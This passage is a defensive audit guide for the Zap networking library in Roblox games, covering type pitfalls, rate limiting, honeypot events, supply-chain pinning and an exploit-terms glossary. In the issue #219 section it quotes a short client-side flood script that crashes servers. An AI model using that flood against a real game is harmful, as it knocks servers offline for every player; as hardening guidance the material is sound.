- **`call: SingleAsync`** — single `SetCallback` listener; second SetCallback silently overrides the first. Common audit miss: a refactor adds a SetCallback in module B without removing the one in module A; A's listener becomes dead code with no warning.
- **`call: SingleSync`** — single listener + sync rules. Same UB / silent-drop / silent-override caveats compounded.
- **`call: Polling` (0.6.18+)** — events accumulate into a queue per actor; consumer must call `event.iter()` each frame to drain. Audit: every `Polling` event has a corresponding `for ... in event.iter() do` loop on a frame-rate signal. Otherwise the queue grows unboundedly = memory leak / OOM.
- **`data: ()`** — no payload. Free for anomaly counters / honeypots.
- **`data: <type>`** — see §5 Type-system pitfalls.

### 4. `funct` field audit

`funct` is Zap's RPC: client calls server, server returns. **By design, Zap forbids server→client→server functions** (no `RemoteFunction:InvokeClient` analogue). This closes the classic "server yields on client return" thread-pool exhaustion vector — but `funct` opens its own:

- **`call: Async`** — server callback runs in a coroutine. Yielding fine. **Required for any handler touching DataStore, MarketplaceService, Profile leases, MessagingService, or `task.wait`.**
- **`call: Sync`** — server callback runs inline. Yielding = UB. Errors silently drop the packet (and the client's `Call` either yields forever or errors out at the 256-call cap).
- **`args`** — same nine-question audit as a `from: Client` event payload. Strongly type with bounded ranges/lengths; refuse `unknown`.
- **`rets`** — what the server sends back. **Audit for §Replication boundary leakage on every field**: a `getInventory` funct returning the full server-side inventory struct leaks every field (debug fields, internal IDs, anti-cheat scores). Send the minimum.
- **Client-side cap (256 in-flight).** The generated client errors with `error("Zap has more than 256 calls awaiting a response, and therefore this packet has been dropped")` if the client has 256 pending `Call`s. **This is a client safety valve, not a server one** — see issue #219, which exploits exactly removing this client-side limit.
- **No `funct` should run unrate-limited.** Per-player token bucket + per-player concurrent-in-flight cap (the `gated` wrapper in `SKILL.md`'s hardening patterns) is mandatory on every `funct.SetCallback`.

### 5. Type-system pitfalls

Each type has at least one footgun. Walk every type used in any `from: Client` `data` / `args`:

- **`unknown`** — completely opts out of validation; payload is whatever Lua serializer accepts. Identical risk to a raw `RemoteEvent` arg with no validation. **Reflexively reject** in any C→S path. If unavoidable (e.g. forwarding a third-party blob), validate manually with `type()` / `typeof()` checks at the handler.
- **Sized integers (`u8` / `i32` / etc.).** Zap enforces `min..max` if a constraint is given; otherwise the type's full range. **A `u32` is still 0–4 294 967 295** — far larger than any "amount of coins" should be. Always constrain (`u32 (0..1000)`).
- **Floats (`f32` / `f64`).** Zap's range syntax does not catch `NaN` or `±inf` for floats reliably (the docs are silent on infinity handling for floats). Validate manually: `if v ~= v or v == math.huge or v == -math.huge then return end`.
- **`string.utf8` / `string.binary`.** Always constrain (`string.utf8 (..32)`). An unconstrained string is a memory-pressure / log-flood vector.
- **Arrays.** Always constrain length (`u8 (0..100)[..50]`). An array with no upper bound is the §219 attack primitive's friend — large buffers + non-yielding deserializer.
- **Maps / Sets.** Same as arrays — there is no per-Zap version length cap; you must enforce one in the schema or in the handler.
- **`Instance` (untyped).** Accepts any Instance. **Same pitfalls as raw RemoteEvent**: validate `inst.Parent ~= nil`, `inst:IsDescendantOf(expectedContainer)`, ownership, class. Zap does not check any of these.
- **`Instance.Player` / `Instance.Tool` / etc.** Class-typed; **also accepts subclasses**. `Instance.BasePart` accepts `Part`, `MeshPart`, `WedgePart`, `TrussPart`, `CornerWedgePart`, `Terrain`. Verify the concrete class with `:IsA` if you specifically need one.
- **Optional Instance (`Instance.X?`).** Receiver gets `nil` if the Instance doesn't exist on their side (not streamed in, server-only Instance, etc.). Handle the `nil` branch.
- **Non-optional Instance (`Instance.X`).** **If the Instance doesn't exist on the receiver, deserialization errors and the packet is dropped silently.** Use case: server fires a batched event with a reference to an unstreamed Instance → packet dropped, dependent UI breaks. Mitigation: prefer `Instance.X?` everywhere replicated visuals are involved; for critical references, call `Zap.SendEvents()` immediately before destroying / reparenting Instances so the queue is flushed before deletion replicates.
- **`CFrame`.** Sent CFrames are **orthonormalized** (the rotation matrix is forced into a valid rotation). If you send a non-orthogonal CFrame (rare — only weird math constructions produce these), the recipient sees a different CFrame than you sent. Subtle desync. If you genuinely need to send a non-orthogonal matrix, send the components and reconstruct on the other side.
- **`AlignedCFrame`.** Compresses rotation to a single byte (1 of 24 axis-aligned rotations). **Throws an error if the rotation is not axis-aligned.** Auditor's concern: if the **server** fires `AlignedCFrame` with a rotation derived from physics / animation / client-supplied state that turned out non-aligned, the server-side code path errors. If a client can tickle that path, it's a soft DoS. Validate axis-alignment before passing to the server-fire helper, or just use `CFrame`.
- **`vector` / `Vector2` / `Vector3`.** Constrain components (`vector(f32 (-1024..1024), f32 (..512), f32 (-1024..1024))`). Otherwise an unconstrained float component is `±inf`-able / `NaN`-able as above.
- **`DateTime` / `DateTimeMillis`.** Sends as Unix timestamp; client cannot send "the future" or "the past beyond reason" without your handler sanity-checking. Always range-clamp on receive.
- **`Color3` / `BrickColor`.** Cosmetic. The only abuse is "send a chat-name color of pure black on black background" which is a UX issue.
- **Optional types (`<type>?`).** Handler must check for `nil`. Easy to miss — `if foo.field then` doesn't help if `field = false` is meaningful.
- **Unit enums (`enum { "A", "B", "C" }`).** Schema-enforced — receiver can only see one of the three strings. Excellent for state-machine transitions.
- **Tagged enums (`enum "type" { Foo { ... }, Bar { ... } }`).** Discriminated union. The tag value is enforced to be one of the declared variants. **Tag-field name collision** — if your variant struct also has a field literally called `type` (or whatever the tag string is), you'll silently shadow it. Pick a tag name like `kind` or `_tag` that won't clash.
- **OR/Union types (`A | B | C`).** Runtime type-checked at write and read; tries each variant in order until one matches. **A union containing `unknown` as a fallback nukes validation** for any payload not matching the earlier variants — they all fall through to `unknown` and the schema is theatre. Reflexively flag.

### 6. Known issues — full mitigations

#### Issue [#219 — server crash via flooded calls / oversized buffers](https://github.com/red-blox/zap/issues/219)

**Status:** open as of v0.6.28. Re-labelled from `bug` to `enhancement` — maintainer position is that **Zap will not throttle**; rate limiting is a user-code responsibility.

**The attack:** modify the client `output.luau` to remove the 256-in-flight cap, then in a `RenderStepped` loop spawn hundreds of `funct.Call`s per frame (or fire raw oversized buffers directly to `ZAP_RELIABLE`). The server's deserializer is single-threaded, non-yielding, and packed into the `OnServerEvent` callback — it processes the entire batch synchronously. Result: server pings spike, all events stall, the place OOM-crashes within seconds. Repro snippet from the issue:

```lua
game:GetService("RunService").RenderStepped:Connect(function()
    for i = 1, 256 do
        task.spawn(function()
            Zap.castFishingPole.call(1 * 100)
        end)
    end
end)
```

**Mitigation playbook (apply all):**

1. **Per-player token bucket on every `funct.SetCallback` and every C→S `event.SetCallback` / `event.On`.** Use the `allow(player)` bucket from `SKILL.md` Hardening. Reject silently above the bucket.
2. **Per-player concurrent in-flight cap** (the `INFLIGHT_MAX` in the `gated` wrapper in `SKILL.md` Hardening). The token bucket is a *rate* limit; this is an *occupancy* limit — bounds peak server work even if a player sends a single huge burst.
3. **Constrain every array / map / set / string in your schema** with an explicit upper bound. An unbounded array is half the attack surface. `string.utf8 (..256)`, `u8 (0..100)[..32]`, `map { [string (..32)]: u32 (0..1000) }`.
4. **Set `manual_event_loop = true`** and clamp `SendEvents` to ≤60 Hz (the snippet in Zap's options docs). This bounds the *send* side; the *receive* side is still the attacker's choice, but bounding outgoing batches helps under retaliation pressure.
5. **Enable `disable_fire_all = true`** if no event needs it — removes the broadcast amplification primitive.
6. **Detect & log `funct` rejections.** Increment an anomaly counter per player; past a threshold, kick + ban-wave eligible. This is your honeypot for #219.
7. **For the truly paranoid**, fork Zap and add a per-batch-size cap in the deserializer (the issue thread links to a community patch). This is the "rebuild the EXE" approach the OP took; viable but leaves you maintaining a fork until a maintained mitigation lands.

#### Issue [#216 — `Player` memory leak when `Fire` runs after `PlayerRemoving`](https://github.com/red-blox/zap/issues/216)

**Status:** open as of v0.6.28.

**The bug:** Zap maintains an internal `player_map` keyed on `Player`. If any code path calls `Zap.X.Fire(player, ...)` *after* the player has left, Zap re-inserts the `Player` into `player_map` and never removes it. Repro:

```lua
Players.PlayerRemoving:Connect(function(player)
    task.wait(5)
    Zap.Test.Fire(player)  -- player is gone; Zap still re-adds them
end)
```

The leaked `Player` userdata holds references to the entire `Player` instance, which can keep `Character`, `PlayerGui`, leaderstats, custom attributes, etc. alive depending on what else holds references. Multiplied across thousands of player joins per server lifetime, this is a steady memory-creep that contributes to long-run crashes that look like "the place gets slower over hours."

**Mitigation:** the `safeFire` wrapper in `SKILL.md` Hardening. Maintain a server-tracked `loaded` set, populate on profile-load complete (NOT raw `PlayerAdded`), clear on `PlayerRemoving` *before* any subsequent `Fire` path can run, and check `player.Parent ~= nil` as belt-and-braces. **Audit every `.Fire(player, ...)` callsite** — especially:
- `task.delay` / `task.spawn` callbacks
- `RunService.Heartbeat` per-player loops
- DataStore async callbacks (`UpdateAsync` continuation)
- MessagingService `SubscribeAsync` handlers
- `MarketplaceService.ProcessReceipt` → `Fire` to confirm grant
- Any code that captures `player` in an upvalue and runs after a yield

Use **codebase-wide search** for `\.Fire\(player` and `\.FireExcept\(player` to enumerate; route every match through `safeFire`.

### 7. Honeypotting under Zap

The classic SKILL.md tripwire pattern is "every `S→C`-only `RemoteEvent` should never see `OnServerEvent`; wire `OnServerEvent` to log + kick." This **doesn't translate to Zap** because:

- A Zap `event` declares its direction via `from:` at compile time.
- The generated server module exposes only the methods valid for that direction. A `from: Server` event has no server-side `SetCallback` / `On`; trying to access it is a static error.
- Zap multiplexes everything onto `ZAP_RELIABLE` / `ZAP_UNRELIABLE` — there are no per-event `RemoteEvent` instances to hook a wrong-direction listener on.

**Zap-native equivalent:** declare a dedicated bait event with no legitimate client invocation:

```zap
event Tripwire = {
    from: Client,
    type: Reliable,
    call: SingleAsync,
    data: (),
}
```

Then on the server (and **only** on the server — never reference `Zap.Tripwire` from any LocalScript in your codebase, that's the entire point):

```lua
Zap.Tripwire.SetCallback(function(player)
    flagAndKick(player, "honeypot:Zap.Tripwire")
end)
```

Real clients never fire it because no real LocalScript calls it. Crafted clients enumerate `client/output.luau` for callable events, see `Tripwire`, and bite. Add several with innocuous-looking names (`UpdateAvatarFx`, `RequestDailyState`, `SubmitTelemetry`).

**Variant — bait `funct`:** declare a `funct` whose `args` accept a sentinel value the legitimate client would never produce, and whose `SetCallback` trips on any invocation. Adds a slow-roast detection signal even for exploiters who are wary of obviously-named events.

### 8. Generated-file placement audit

Walk the place tree (Rojo `default.project.json`, in-Studio Explorer, or however the project is laid out):

- **`server/output.luau`**:
  - **MUST** live in `ServerStorage` or `ServerScriptService` (or any descendant). These are the only containers Roblox does not replicate to clients.
  - **MUST NOT** be in `ReplicatedStorage`, `ReplicatedFirst`, `StarterPlayer*`, `StarterGui`, `StarterPack`, `Workspace`, `Chat`, or inside any `Tool` / character model. Any of these = the entire server schema (event names, type definitions, `SetCallback` handler signatures) is dumpable by every client.
  - Common drift: a `Shared/` folder containing `Network/server.luau` "for require convenience." Move it.
- **`client/output.luau`**:
  - Anywhere replicated is fine — the client must require it. Common: `ReplicatedStorage.Network.client` or `StarterPlayer.StarterPlayerScripts.Network.client`.
  - **Treat as fully public.** Every event name, every type constraint, every constant in your `.zap` config is in the dumped binary. Apply all §Replication boundary rules: no embedded webhook URLs, no admin UserIds, no anti-cheat thresholds, no internal product IDs, no DataStore key formats.
  - In particular, do **not** embed secrets in struct field defaults or in tag-string values that hint at server logic (`enum "purchase_state" { GrantedNoReceipt, GrantedReceipt, ExploitDetected, AdminOverride }` — every variant name leaks intent).
- **`types_output`** (if used): same rules as the file it sits next to. Server types in server-only containers; client types anywhere replicated.
- **`tooling_output`** (if `tooling = true`): never ship to production. Verify the path is excluded from the production Rojo project, or that `tooling` is build-flag-gated.

### 9. Buffer obscurity is not security

Zap's homepage states: *"Buffers make reverse engineering your game's networking much harder."* This is **misleading**:

- The generated `client/output.luau` contains the full pack/unpack code, every event ID, every type's exact byte layout, every range constraint, every tag-string value. An exploiter `:GetSource()`s the module and has a full deserializer in seconds.
- `remote_scope` / `remote_folder` rename the surface but exploiters enumerate `ReplicatedStorage:GetDescendants()` looking for `RemoteEvent` / `UnreliableRemoteEvent` instances; the rename is one extra line of attacker code.
- Buffer-packed bytes are not encrypted; they are a serialization format. Anyone with the schema (which is shipped to every client) can read or forge them.

**Treat Zap as bandwidth + type validation, not as obfuscation.** The `## Replication boundary` section of `SKILL.md` applies to the entire `.zap` config and to both generated outputs.

### 10. Build / supply chain

- **Pin the Zap CLI version.** Use `aftman` with a lockfile (`aftman.toml` containing `red-blox/zap = "0.6.28"`) or a pinned GitHub release SHA. An unpinned `aftman add red-blox/zap` pulls latest on every developer machine and CI run, opening you to a compromised release replacing the binary mid-development.
- **Pin via SHA in CI.** GitHub Actions: download the release artifact by tag *and* verify its SHA against a checksum committed to the repo. Treat the Zap binary like any other build-time dependency that runs arbitrary code on your machine.
- **Regenerate both outputs in CI from the same source on every push.** Drift between `server/output.luau` and `client/output.luau` (e.g. dev regenerated only the server, committed both, but client is from an older schema) → silent deserialization failures in production. CI step: `zap config.zap && git diff --exit-code server/output.luau client/output.luau` — fail the build if outputs are stale.
- **Audit the [Zappy Studio plugin](https://github.com/Ultrasonic1209/Zappy/) like any other plugin.** It runs with full Studio permissions on your place file. Read the source before installing; pin the version; disable "Allow HTTP Requests" if you grant any third-party plugin trust at all (per §Studio plugin supply chain).
- **Reject the web playground for production configs.** Convenient for prototyping, but the workflow of paste-config → copy-generated-code into Studio is exactly the surface a typo-squatted clone playground would target. Use the CLI for anything shipping.
- **Multiple `.zap` configs in one place.** Each generates its own `ZAP_RELIABLE` / `ZAP_UNRELIABLE` defaults — they will collide on the same folder. Set a distinct `remote_scope` per config and verify the folders don't overlap.

### 11. Migration sanity check

When auditing a codebase that recently migrated raw `RemoteEvent`s → Zap, the two most common mistakes:

1. **Schema added, semantics unchanged.** The `event SubmitQuestComplete = { from: Client, ..., data: { questId: u16 } }` is now type-safe — but the handler still does `state[player].quests[questId].complete = true` without checking whether the server has independently observed the kill / pickup that completes the quest. Schema validates the *type*; the dup bug is in the *trust*. Re-walk every C→S event with the nine-question audit (§2 of triage workflow); Zap doesn't make any of those checks for you.
2. **Generated module imported, raw `RemoteEvent` left in place.** During migration, the old `RemoteEvent.OnServerEvent` listener is sometimes kept "until we test the new path." Both paths run simultaneously; the old one bypasses Zap's validation entirely. Grep for `OnServerEvent` after migration; every match is suspect.

Other migration-stage smells:

- `unknown` everywhere, "we'll constrain types later." This is the migration that ships unsafe.
- `write_checks = false` shipped because someone benchmarked once and didn't measure the validation cost was negligible.
- `Sync` calls used because "Zap recommended it for performance" — Zap explicitly recommends `Async` and warns about sync. Re-read the docs.
- Honeypots from the old `RemoteEvent` codebase (`SafeRemote.OnServerEvent:Connect(kick)`) deleted because "we don't have raw RemoteEvents anymore." The bait pattern needs to be re-implemented in Zap (§7 above) — not abandoned.
- ProfileStore session-lock + Zap `funct` returning live profile data: ensure the funct's `gated` wrapper doesn't bypass the profile-loaded check (a common drift is the rate limiter passing the call through before the profile is loaded; the handler then NPEs on the missing profile).

---

## Glossary of executor / exploit terms

For when the user uses jargon and you need to know what they mean:

- **Executor.** A program that injects a Lua VM into the Roblox client and lets the user run arbitrary scripts in it. Synapse X (defunct), Wave, Volt, Solara, Xeno, Krnl are common names.
- **UNC (Unified Naming Convention).** A spec for executor APIs so script kiddies' scripts work across executors. UNC-compliant means the executor exposes the standard primitives (`hookfunction`, `getrawmetatable`, `getconnections`, `firesignal`, etc.).
- **Hyperion / Byfron.** The current Roblox client anti-tamper. Killed kernel-mode injectors and made user-mode injection harder; did not end injection.
- **Hookfunction / hookmetamethod.** Replacing a global function (e.g. `game.HttpGet`) with a wrapper that intercepts the call. Used to spy on or modify game behaviour.
- **Firesignal.** Triggering a Roblox signal (RBXScriptSignal) directly from the executor without the originating event happening — fires `OnClientEvent`, `Triggered`, `Activated` etc. on demand.
- **Getconnections.** Enumerating every Lua function bound to a signal — used to call them out-of-band or remove them.
- **Getgc.** Walking the Lua garbage collector to find every function/table/userdata in the runtime — used to extract source, find upvalues, locate "hidden" state.
- **Decompiler.** Turns Lua bytecode (and Luau bytecode after enough reverse-engineering) back into source. Effectively assume your client source is published.
- **Dex / Dark Dex.** Object-tree explorer that runs in the executor — lets the exploiter browse the full game tree like Studio's Explorer, including ServerStorage references their client knows about.
- **ESP.** "Extra Sensory Perception" — drawing other players' positions, names, hitboxes through walls. Powered by data the server replicates.
- **Aimbot.** Auto-aim using server-replicated position data. Mitigated by accurate server-side hit validation, not by trying to hide positions.
- **Fly / Noclip / Speed.** Direct character physics manipulation. See [Network ownership](#network-ownership) and the speed detector pattern.
